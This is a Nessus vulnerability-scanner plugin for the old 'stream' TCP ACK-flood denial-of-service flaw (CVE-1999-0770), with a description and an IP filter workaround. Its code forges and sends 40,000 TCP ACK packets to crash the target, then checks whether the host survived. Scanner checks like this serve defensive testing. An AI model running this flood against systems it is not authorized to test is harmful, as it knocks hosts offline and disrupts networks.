#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added links to the Bugtraq message archive
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10271);
 script_bugtraq_id(549);
 script_version ("$Revision: 1.15 $");
 # BID549 / CVE-1999-0770 = FW-1 saturation
 script_cve_id("CVE-1999-0770");

 name["english"] = "stream.c";
 name["francais"] = "stream.c";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It seems it was possible to make the remote server crash 
using the 'stream' (or 'raped') attack. 

An attacker may use this flaw to shut down this server, thus preventing 
your network from working properly.

Solution : contact your operating system vendor for a patch.
Workaround : if you use IP filter,
then add these rules :

	block in quick proto tcp from any to any head 100
	pass in quick proto tcp from any to any flags S keep state group 100
	pass in all

Reference : http://online.securityfocus.com/archive/1/42729
Reference : http://online.securityfocus.com/archive/1/42723

Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Crashes the remote host using the 'stream' attack";
 summary["francais"] = "Plante le serveur distant en utilisant l'attaque 'stream'";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 if (ACT_FLOOD) script_category(ACT_FLOOD);
 else		script_category(ACT_KILL_HOST);
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);

 
 exit(0);
}

#
# The script code starts here
#




addr = this_host();
id = rand();
sport = rand();
seq = rand();

port = get_host_open_port();
if(!port)port = rand();
			

start_denial();
for(i=0;i<40000;i=i+1)
{
 id = id + 1;
 sport = sport + 1;
 seq  = seq+1;
 ip = forge_ip_packet(   ip_v : 4,
			ip_hl : 5,
			ip_tos : 0x08,
			ip_len : 20,
		        ip_id : id,
			ip_p : IPPROTO_TCP,
			ip_ttl : 255,
		        ip_off : 0,
			ip_src : addr);
			
 tcpip = forge_tcp_packet(    ip      : ip,
			     th_sport : sport,    
			     th_dport : port,   
			     th_flags : TH_ACK,
		             th_seq   : seq,
			     th_ack   : 0,
			     th_x2    : 0,
		 	     th_off   : 5,     
			     th_win   : 2048, 
			     th_urp   : 0);
			     
			     
 send_packet(tcpip, pcap_active:FALSE);
}
sleep(5);
alive = end_denial();

if(!alive)     {
                set_kb_item(name:"Host/dead", value:TRUE);
                security_hole(0);
                }
